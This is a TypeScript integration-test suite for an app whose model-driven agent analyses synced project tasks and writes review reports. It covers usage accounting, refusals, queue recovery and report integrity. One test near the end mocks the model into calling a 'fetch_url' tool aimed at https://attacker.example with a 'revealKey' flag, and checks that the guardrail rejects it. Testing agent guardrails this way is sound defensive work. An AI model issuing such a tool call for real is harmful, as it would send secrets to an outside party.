import { afterAll, beforeAll, expect, it, vi } from 'vitest';
import request from 'supertest';
import { randomUUID } from 'node:crypto';
import { SignJWT } from 'jose';
import { createTestApp } from './support/create-test-app.js';
import type { IRuntime } from './support/create-test-app.js';
import { config } from '@app/shared/config/config.schema';
import { ModelClient } from '@app/modules/agent/services/model-client.service';
import type { IModelResult } from '@app/modules/agent/agent.types';
import { ProvidersService } from '@app/modules/providers/providers.service';
import { QueueService } from '@app/modules/jobs/services/queue.service';
import { ProcessorService } from '@app/modules/jobs/services/processor.service';
import { JobsService } from '@app/modules/jobs/services/jobs.service';
import { ProviderError } from '@app/errors/provider.error';
import { JobView, ReviewView } from '@self-review/contracts';

const configuration = config();
const period = { mode: 'period', startDate: '2026-10-01', endDate: '2026-10-31' };
const knownUsage = {
	inputTokens: 100,
	outputTokens: 20,
	cachedInputTokens: 30,
	reasoningTokens: 10,
};
let runtime: IRuntime;
let jar: string[] = [];
let csrf = '';
let userId: string;
let sessionId: string;
let projects: { id: string; externalId: string }[];
let sourceId: string;
let reportId: string;
const cookies = (response: { headers: Record<string, unknown> }) =>
	((response.headers['set-cookie'] as string[]) ?? []).map((value) => value.split(';')[0]!);
const get = (path: string) =>
	request(runtime.app.getHttpServer())
		.get('/api' + path)
		.set('Cookie', jar);
const post = (path: string, body: object) =>
	request(runtime.app.getHttpServer())
		.post('/api' + path)
		.set('Cookie', jar)
		.set('Origin', configuration.APP_ORIGIN)
		.set('X-CSRF-Token', csrf)
		.send(body);
function projectId(externalId = 'demo-platform') {
	return projects.find((project) => project.externalId === externalId)!.id;
}
async function waitFor(predicate: () => Promise<boolean>) {
	for (let iteration = 0; iteration < 400; iteration++) {
		if (await predicate()) {
			return;
		}
		await new Promise((resolve) => setTimeout(resolve, 25));
	}
	throw new Error('Synthetic workflow condition did not complete');
}
async function terminal(runId: string) {
	await waitFor(
		async () => !['queued', 'running'].includes((await get(`/jobs/${runId}`)).body.state),
	);
	return JobView.parse((await get(`/jobs/${runId}`)).body);
}
async function delivered(runId: string) {
	await waitFor(
		async () =>
			(await runtime.app.get(QueueService).queue.getJob(runId))
				?.getState()
				.then((state) => state === 'completed') ?? false,
	);
}
function gate() {
	let release!: () => void;
	const promise = new Promise<void>((resolve) => {
		release = resolve;
	});
	return { promise, release };
}
const emptyAnalysis: IModelResult = {
	output: [],
	responseId: null,
	usage: null,
	text: JSON.stringify({
		schemaVersion: '1.0',
		findings: [],
		limitations: [],
		explanation: 'No supported outcome.',
	}),
};

beforeAll(async () => {
	if (
		!configuration.DATABASE_URL.endsWith('/self_review_test') ||
		!configuration.REDIS_URL.endsWith('/15')
	) {
		throw new Error('Isolated storage required');
	}
	const codes = new Map<string, string>();
	runtime = await createTestApp({
		config: { ...configuration, APP_MODE: 'offline' },
		worker: true,
		mail: {
			verify: async () => undefined,
			send: async (email, code) => {
				codes.set(email, code);
			},
		},
	});
	await runtime.db.user.deleteMany();
	const email = randomUUID() + '@example.test';
	const signup = await post('/auth/signup', { email, password: 'synthetic-password-123' });
	jar = cookies(signup);
	const verified = await post('/auth/verify-otp', {
		challengeId: signup.body.challengeId,
		code: codes.get(email),
	});
	expect(verified.status).toBe(201);
	jar = cookies(verified);
	csrf = verified.body.csrfToken;
	userId = verified.body.user.id;
	sessionId = verified.body.sid;
	const connection = await post('/connections', { provider: 'fixture' });
	projects = (await get(`/connections/${connection.body.id}/projects`)).body.items;
	await runtime.app.listen(0, '127.0.0.1');
});
afterAll(async () => {
	vi.restoreAllMocks();
	await runtime?.close();
});

it('sums every leaf/reducer attempt once with globally unique attempt numbers and bounded inputs', async () => {
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		expect(input.allowedIds.length).toBeLessThanOrEqual(10);
		expect(Buffer.byteLength(JSON.stringify(input))).toBeLessThan(65536);
		return { ...(await original(input)), usage: knownUsage };
	});
	try {
		const accepted = await post(`/projects/${projectId('demo-137')}/syncs`, {
			selection: period,
			generateReview: true,
			idempotencyKey: randomUUID(),
		});
		const sync = await terminal(accepted.body.runId);
		const review = await terminal(sync.reviewRunId!);
		expect(sync.state).toBe('succeeded');
		expect(review.state).toBe('succeeded');
		for (const runId of [sync.runId, review.runId]) {
			const attempts = await runtime.db.modelAttempt.findMany({
				where: { runId },
				orderBy: { attemptNo: 'asc' },
			});
			const batches = await runtime.db.analysisBatch.findMany({ where: { runId } });
			expect(batches.filter((batch) => batch.level === 0)).toHaveLength(14);
			expect(batches.some((batch) => batch.level === 2)).toBe(true);
			expect(attempts.map((attempt) => attempt.attemptNo)).toEqual(
				attempts.map((_attempt, index) => index + 1),
			);
			const saved = JobView.parse((await get(`/jobs/${runId}`)).body);
			expect(saved.usage).toMatchObject({
				attempts: attempts.length,
				inputTokens: attempts.length * 100,
				outputTokens: attempts.length * 20,
				cachedInputTokens: attempts.length * 30,
				reasoningTokens: attempts.length * 10,
				unknown: true,
				estimatedCostUsd: null,
			});
		}
	} finally {
		vi.restoreAllMocks();
	}
});

it('saves all 137 imports but publishes no analysis or automatic review after a middle-batch refusal', async () => {
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		if (input.allowedIds.includes('BULK-011')) {
			return { ...emptyAnalysis, text: '', errorCode: 'MODEL_REFUSAL' };
		}
		return original(input);
	});
	try {
		const accepted = await post(`/projects/${projectId('demo-137')}/syncs`, {
			selection: period,
			generateReview: true,
			idempotencyKey: randomUUID(),
		});
		const state = await terminal(accepted.body.runId);
		expect(state).toMatchObject({
			state: 'partial',
			importComplete: true,
			analysisComplete: false,
			errorCode: 'MODEL_REFUSAL',
			reviewRunId: null,
			counts: { saved: 137 },
		});
		const batches = await runtime.db.analysisBatch.findMany({
			where: { runId: state.runId },
			orderBy: { ordinal: 'asc' },
		});
		expect(batches.map((batch) => batch.state)).toEqual(['succeeded', 'failed']);
		expect(await runtime.db.modelAttempt.count({ where: { batchId: batches[1]!.id } })).toBe(1);
		expect(await runtime.db.syncAnalysis.count({ where: { syncRunId: state.runId } })).toBe(0);
	} finally {
		vi.restoreAllMocks();
	}
});

it.each(['empty', 'capped', 'failed', 'truncated'] as const)(
	'persists %s comment availability and preserves it in copied snapshots',
	async (scenario) => {
		const model = runtime.app.get(ModelClient);
		const original = model.respond.bind(model);
		vi.spyOn(runtime.app.get(ProvidersService), 'comments').mockImplementation(async () => {
			if (scenario === 'failed') {
				throw new ProviderError('PROVIDER_CREDENTIALS_INVALID');
			}
			return {
				items:
					scenario === 'empty'
						? []
						: Array.from({ length: scenario === 'capped' ? 6 : 1 }, (_item, index) => ({
								externalId: `comment-${index}`,
								body:
									scenario === 'truncated' ||
									(scenario === 'capped' && index === 5)
										? 'x'.repeat(65537)
										: 'Synthetic comment.',
								author: null,
								createdAt: new Date(),
							})),
				hasMore: scenario === 'capped',
			};
		});
		vi.spyOn(model, 'respond').mockImplementation(async (input) => {
			if (input.forcedTool) {
				return original(input);
			}
			if (input.report) {
				return {
					...emptyAnalysis,
					text: JSON.stringify({
						schemaVersion: '1.0',
						groupTitles: ['', '', '', ''],
						claims: [],
						limitations: [],
						explanation: 'No claims.',
					}),
				};
			}
			if (
				!input.history.some(
					(item) => item.type === 'function_call' && item.name === 'get_issue_comments',
				)
			) {
				return {
					...emptyAnalysis,
					text: '',
					output: [
						{
							type: 'function_call',
							name: 'get_issue_comments',
							arguments: '{"issueId":"DEMO-101"}',
							call_id: randomUUID(),
						},
					],
				};
			}
			return emptyAnalysis;
		});
		try {
			const accepted = await post(`/projects/${projectId()}/syncs`, {
				selection: period,
				generateReview: true,
				idempotencyKey: randomUUID(),
			});
			const state = await terminal(accepted.body.runId);
			const isIncomplete = ['failed', 'truncated'].includes(scenario);
			expect(state.state).toBe(isIncomplete ? 'partial' : 'succeeded');
			expect(state.importComplete).toBe(!isIncomplete);
			expect(state.counts.failed).toBe(isIncomplete ? 1 : 0);
			if (state.reviewRunId) {
				const review = await terminal(state.reviewRunId);
				const source = await runtime.db.jobRun.findUniqueOrThrow({
					where: { id: state.runId },
				});
				const report = ReviewView.parse(
					(await get(`/reviews/${source.currentReviewReportId}`)).body,
				);
				expect(review.state).toBe('succeeded');
				expect(report.draft.limitations.join(' ')).toContain(
					'Optional comments were not read',
				);
				if (scenario === 'capped') {
					expect(report.draft.limitations.join(' ')).toContain('were capped');
				}
			}
			const base = await runtime.db.taskSnapshot.findFirstOrThrow({
				where: { syncRunId: state.runId, externalId: 'DEMO-101' },
				include: { comments: true },
			});
			expect(base.commentReadState).toBe(isIncomplete ? scenario : 'read');
			expect(base.commentReadAt).not.toBeNull();
			expect(base.comments).toHaveLength(
				scenario === 'capped' ? 5 : scenario === 'truncated' ? 1 : 0,
			);
			expect(base.commentsTruncated).toBe(scenario === 'capped');
			const other = await runtime.db.taskSnapshot.findFirstOrThrow({
				where: { syncRunId: state.runId, externalId: 'DEMO-102' },
			});
			expect(other.commentReadState).toBe('not_read');
			const commentReads = runtime.app.get(ProvidersService).comments;
			vi.mocked(commentReads).mockClear();
			const refresh = await post(`/projects/${projectId()}/syncs`, {
				selection: { mode: 'tasks', baseSyncRunId: state.runId, taskIds: [other.id] },
				idempotencyKey: randomUUID(),
			});
			const copied = await terminal(refresh.body.runId);
			expect(copied.state).toBe(isIncomplete ? 'partial' : 'succeeded');
			expect(commentReads).not.toHaveBeenCalled();
			const copy = await runtime.db.taskSnapshot.findFirstOrThrow({
				where: { syncRunId: copied.runId, externalId: base.externalId },
				include: { comments: true },
			});
			expect(copy).toMatchObject({
				copiedFromSnapshotId: base.id,
				commentReadState: base.commentReadState,
				commentReadAt: base.commentReadAt,
				commentsTruncated: base.commentsTruncated,
				commentErrorCode: base.commentErrorCode,
			});
			expect(copy.comments.map((comment) => comment.body)).toEqual(
				base.comments.map((comment) => comment.body),
			);
		} finally {
			vi.restoreAllMocks();
		}
	},
);

it('fences duplicate deliveries and late model results after recovery, retaining unknown usage', async () => {
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	const blocked = gate();
	let requests = 0;
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		if (++requests === 2) {
			await blocked.promise;
		}
		return { ...(await original(input)), usage: knownUsage };
	});
	let runId: string | undefined;
	try {
		const accepted = await post(`/projects/${projectId()}/syncs`, {
			selection: period,
			generateReview: true,
			idempotencyKey: randomUUID(),
		});
		runId = accepted.body.runId;
		await waitFor(async () => requests === 2);
		await Promise.all([
			runtime.app.get(ProcessorService).execute(runId!),
			runtime.app.get(ProcessorService).execute(runId!),
		]);
		expect(requests).toBe(2);
		await runtime.db.taskSnapshot.updateMany({
			where: { syncRunId: runId, externalId: 'DEMO-101' },
			data: {
				commentReadState: 'failed',
				commentErrorCode: 'PROVIDER_READ_FAILED',
				commentReadAt: new Date(),
			},
		});
		await runtime.db.jobRun.update({
			where: { id: runId },
			data: { heartbeatAt: new Date(Date.now() - 60000) },
		});
		await Promise.all([
			runtime.app.get(QueueService).reconcile(),
			runtime.app.get(QueueService).reconcile(),
		]);
		const state = await terminal(runId!);
		expect(state).toMatchObject({
			state: 'partial',
			errorCode: 'RUN_INTERRUPTED',
			importComplete: false,
			analysisComplete: false,
			reviewRunId: null,
		});
		expect(state.usage).toMatchObject({
			attempts: 2,
			unknown: true,
			inputTokens: 100,
			outputTokens: 20,
			estimatedCostUsd: null,
		});
		const attempts = await runtime.db.modelAttempt.findMany({
			where: { runId },
			orderBy: { attemptNo: 'asc' },
		});
		expect(attempts.map((attempt) => attempt.status)).toEqual(['completed', 'interrupted']);
		const batch = await runtime.db.analysisBatch.findFirstOrThrow({ where: { runId } });
		expect(JSON.stringify(batch.trace)).toContain('unit_interrupted');
		blocked.release();
		await delivered(runId!);
		expect(
			await runtime.db.modelAttempt.findMany({
				where: { runId },
				orderBy: { attemptNo: 'asc' },
			}),
		).toEqual(attempts);
		expect(await runtime.db.analysisBatch.findUnique({ where: { id: batch.id } })).toEqual(
			batch,
		);
		expect(JobView.parse((await get(`/jobs/${runId}`)).body)).toEqual(state);
	} finally {
		blocked.release();
		if (runId) {
			await delivered(runId);
		}
		vi.restoreAllMocks();
	}
});

it('allows old progressing jobs and long queue waits, but terminates a fixed expired unit', async () => {
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	const blocked = gate();
	let entered = false;
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		entered = true;
		await blocked.promise;
		return original(input);
	});
	let runId: string | undefined;
	try {
		const accepted = await post(`/projects/${projectId()}/syncs`, {
			selection: period,
			idempotencyKey: randomUUID(),
		});
		runId = accepted.body.runId;
		await waitFor(async () => entered);
		await runtime.db.jobRun.update({
			where: { id: runId },
			data: {
				createdAt: new Date(Date.now() - 3600000),
				startedAt: new Date(Date.now() - 1800000),
				heartbeatAt: new Date(),
				unitDeadlineAt: new Date(Date.now() + 300000),
			},
		});
		await runtime.app.get(QueueService).reconcile();
		expect((await get(`/jobs/${runId}`)).body.state).toBe('running');
		await runtime.db.jobRun.update({
			where: { id: runId },
			data: { unitDeadlineAt: new Date(Date.now() - 1000) },
		});
		await runtime.app.get(QueueService).reconcile();
		expect(await terminal(runId!)).toMatchObject({
			state: 'partial',
			errorCode: 'UNIT_TIMEOUT',
		});
	} finally {
		blocked.release();
		if (runId) {
			await delivered(runId);
		}
		vi.restoreAllMocks();
	}
});

it('retains saved snapshots/reports through isolated Redis data loss and reconciles the same queued command', async () => {
	const accepted = await post(`/projects/${projectId()}/syncs`, {
		selection: period,
		generateReview: true,
		idempotencyKey: randomUUID(),
	});
	const source = await terminal(accepted.body.runId);
	await terminal(source.reviewRunId!);
	sourceId = source.runId;
	reportId = (await runtime.db.jobRun.findUniqueOrThrow({ where: { id: sourceId } }))
		.currentReviewReportId!;
	const reportBefore = (await get(`/reviews/${reportId}`)).body;
	const processor = runtime.app.get(ProcessorService);
	const queue = runtime.app.get(QueueService);
	await delivered(source.reviewRunId!);
	await processor.onApplicationShutdown();
	try {
		const body = { selection: period, idempotencyKey: randomUUID() };
		const queued = await post(`/projects/${projectId()}/syncs`, body);
		expect(queued.status).toBe(202);
		expect((await queue.queue.getJob(queued.body.runId))?.opts.attempts).toBe(1);
		await runtime.redis.flushdb();
		expect((await get(`/reviews/${reportId}`)).body).toEqual(reportBefore);
		expect(
			(await get(`/projects/${projectId()}/tasks?syncRunId=${sourceId}`)).body.items,
		).toHaveLength(6);
		await runtime.db.jobRun.update({
			where: { id: queued.body.runId },
			data: { createdAt: new Date(Date.now() - 3600000) },
		});
		await queue.reconcile();
		expect((await get(`/jobs/${queued.body.runId}`)).body.state).toBe('queued');
		const replay = await post(`/projects/${projectId()}/syncs`, body);
		expect(replay.body.runId).toBe(queued.body.runId);
		processor.onModuleInit();
		expect((await terminal(queued.body.runId)).state).toBe('succeeded');
	} catch (error) {
		processor.onModuleInit();
		throw error;
	}
});

it('keeps uncertain enqueue outcomes durable without overwriting claimed or terminal work', async () => {
	const queue = runtime.app.get(QueueService);
	const add = vi
		.spyOn(queue.queue, 'add')
		.mockRejectedValue(new Error('Synthetic lost queue acknowledgment'));
	const blocked = gate();
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	let entered = false;
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		entered = true;
		await blocked.promise;
		return original(input);
	});
	let execution: Promise<void> | undefined;
	let runId: string | undefined;
	try {
		const accepted = await post(`/projects/${projectId()}/syncs`, {
			selection: period,
			idempotencyKey: randomUUID(),
		});
		runId = accepted.body.runId;
		expect(accepted.status).toBe(202);
		expect((await get(`/jobs/${runId}`)).body).toMatchObject({
			state: 'queued',
			errorCode: 'ENQUEUE_PENDING',
		});
		execution = runtime.app.get(ProcessorService).execute(runId!);
		await waitFor(async () => entered);
		const running = (await get(`/jobs/${runId}`)).body;
		expect(running).toMatchObject({ state: 'running', errorCode: null });
		await queue.enqueue(runId!);
		expect((await get(`/jobs/${runId}`)).body).toEqual(running);
		blocked.release();
		await execution;
		const before = await terminal(runId!);
		await queue.enqueue(runId!);
		expect(JobView.parse((await get(`/jobs/${runId}`)).body)).toEqual(before);
		expect(add).toHaveBeenCalledTimes(3);
	} finally {
		blocked.release();
		await execution;
		vi.restoreAllMocks();
	}
});

it('rejects internal/source identifier confusion before acceptance and isolates historical report pointers', async () => {
	const task = await runtime.db.taskSnapshot.findFirstOrThrow({ where: { syncRunId: sourceId } });
	for (const body of [
		{ sourceSyncRunId: sourceId, idempotencyKey: randomUUID() },
		{ syncRunId: sourceId, trigger: 'automatic', idempotencyKey: randomUUID() },
	]) {
		expect((await post(`/projects/${projectId()}/reviews`, body)).status).toBe(400);
	}
	const invalidSelection = await post(`/projects/${projectId()}/syncs`, {
		selection: { mode: 'tasks', baseSyncRunId: sourceId, taskIds: [task.externalId] },
		idempotencyKey: randomUUID(),
	});
	expect(invalidSelection.status).toBe(400);
	const refresh = await post(`/projects/${projectId()}/syncs`, {
		selection: { mode: 'tasks', baseSyncRunId: sourceId, taskIds: [task.id] },
		generateReview: true,
		idempotencyKey: randomUUID(),
	});
	const newer = await terminal(refresh.body.runId);
	await terminal(newer.reviewRunId!);
	const pointer = (await runtime.db.jobRun.findUniqueOrThrow({ where: { id: newer.runId } }))
		.currentReviewReportId;
	const review = await post(`/projects/${projectId()}/reviews`, {
		syncRunId: sourceId,
		idempotencyKey: randomUUID(),
	});
	await terminal(review.body.runId);
	expect(
		(await runtime.db.jobRun.findUniqueOrThrow({ where: { id: newer.runId } }))
			.currentReviewReportId,
	).toBe(pointer);
	expect((await get(`/reviews/${reportId}`)).status).toBe(200);
});

it('closes SSE at its original JWT expiry and cleans polling even while a database read is pending', async () => {
	const queue = runtime.app.get(QueueService);
	vi.spyOn(queue, 'enqueue').mockResolvedValue(undefined);
	const accepted = await post(`/projects/${projectId()}/syncs`, {
		selection: period,
		idempotencyKey: randomUUID(),
	});
	vi.restoreAllMocks();
	const jobs = runtime.app.get(JobsService);
	const original = jobs.view.bind(jobs);
	const pending = gate();
	let polls = 0;
	vi.spyOn(jobs, 'view').mockImplementation(async (run) => {
		if (run.id === accepted.body.runId && ++polls > 1) {
			await pending.promise;
		}
		return original(run);
	});
	const deadline = Math.floor(Date.now() / 1000) + 3;
	const token = await new SignJWT({ sid: sessionId, amr: ['pwd', 'otp'] })
		.setProtectedHeader({ alg: 'HS256' })
		.setSubject(userId)
		.setIssuer('self-review-app')
		.setAudience('self-review-api')
		.setIssuedAt()
		.setExpirationTime(deadline)
		.sign(new TextEncoder().encode(configuration.JWT_SECRET));
	const address = runtime.app.getHttpServer().address() as { port: number };
	try {
		const response = await fetch(
			`http://127.0.0.1:${address.port}/api/jobs/${accepted.body.runId}/events`,
			{ headers: { Cookie: `sr_access=${token}` }, signal: AbortSignal.timeout(7000) },
		);
		expect(response.status).toBe(200);
		const text = await response.text();
		expect(text).toContain(accepted.body.runId);
		expect(Date.now()).toBeGreaterThanOrEqual(deadline * 1000);
		expect(Date.now()).toBeLessThan(deadline * 1000 + 1000);
		pending.release();
		await new Promise((resolve) => setTimeout(resolve, 1100));
		expect(polls).toBe(2);
	} finally {
		pending.release();
		vi.restoreAllMocks();
		await queue.enqueue(accepted.body.runId);
		await terminal(accepted.body.runId);
	}
});

it('rejects injected arbitrary URL tools before any provider read and keeps the scoped snapshot', async () => {
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	const comments = vi.spyOn(runtime.app.get(ProvidersService), 'comments');
	vi.spyOn(model, 'respond').mockImplementation(async (input) =>
		input.forcedTool
			? original(input)
			: {
					...emptyAnalysis,
					text: '',
					output: [
						{
							type: 'function_call',
							name: 'fetch_url',
							arguments: '{"url":"https://attacker.example","revealKey":true}',
							call_id: randomUUID(),
						},
					],
				},
	);
	try {
		const accepted = await post(`/projects/${projectId()}/syncs`, {
			selection: period,
			generateReview: true,
			idempotencyKey: randomUUID(),
		});
		const state = await terminal(accepted.body.runId);
		expect(state).toMatchObject({
			state: 'partial',
			errorCode: 'GUARDRAIL_VIOLATION',
			reviewRunId: null,
			counts: { saved: 6 },
		});
		expect(comments).not.toHaveBeenCalled();
		const trace = await get(`/jobs/${state.runId}/trace`);
		expect(JSON.stringify(trace.body)).not.toContain('https://attacker.example');
	} finally {
		vi.restoreAllMocks();
	}
});

it('rejects evidence from another saved snapshot without replacing the current report', async () => {
	const source = await runtime.db.jobRun.findUniqueOrThrow({ where: { id: sourceId } });
	const currentReportId = source.currentReviewReportId;
	const model = runtime.app.get(ModelClient);
	const original = model.respond.bind(model);
	let requests = 0;
	vi.spyOn(model, 'respond').mockImplementation(async (input) => {
		if (!input.report) {
			return original(input);
		}
		requests++;
		const exposed = input.sources.find((item) => item.kind === 'description')!;
		return {
			...emptyAnalysis,
			text: JSON.stringify({
				schemaVersion: '1.0',
				groupTitles: ['Area', '', '', ''],
				claims: [
					{
						groupIndex: 0,
						kind: 'task_description',
						text: 'Synthetic source mismatch.',
						evidence: [
							{
								sourceId: exposed.id.replace(sourceId, randomUUID()),
								quote: exposed.textExcerpt.slice(0, 40),
							},
						],
					},
				],
				limitations: [],
				explanation: 'Wrong saved snapshot.',
			}),
		};
	});
	try {
		const accepted = await post(`/projects/${projectId()}/reviews`, {
			syncRunId: sourceId,
			idempotencyKey: randomUUID(),
		});
		expect(await terminal(accepted.body.runId)).toMatchObject({
			state: 'failed',
			errorCode: 'INVALID_MODEL_OUTPUT',
		});
		expect(requests).toBe(2);
		expect(
			(await runtime.db.jobRun.findUniqueOrThrow({ where: { id: sourceId } }))
				.currentReviewReportId,
		).toBe(currentReportId);
		expect(
			await runtime.db.reviewReport.count({ where: { reviewRunId: accepted.body.runId } }),
		).toBe(0);
	} finally {
		vi.restoreAllMocks();
	}
});
